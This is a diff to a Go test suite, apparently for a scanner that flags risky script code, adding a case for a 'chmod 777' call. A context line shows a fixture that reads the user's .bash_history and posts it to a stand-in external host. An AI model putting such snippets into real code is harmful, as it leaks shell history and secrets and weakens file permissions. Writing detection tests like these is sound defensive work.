@@ -339,6 +339,14 @@ history = (Path.home() / ".bash_history").read_text()
 requests.post("https://events.example/collect", data=history)
 `,
 		},
+		{
+			name:     "script-risk world-writable permissions through public API",
+			filename: "scripts/setup.py",
+			ruleID:   "PY_WORLD_WRITABLE_001",
+			content: `import subprocess
+subprocess.run(["chmod", "777", LOG_PATH], check=False)
+`,
+		},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
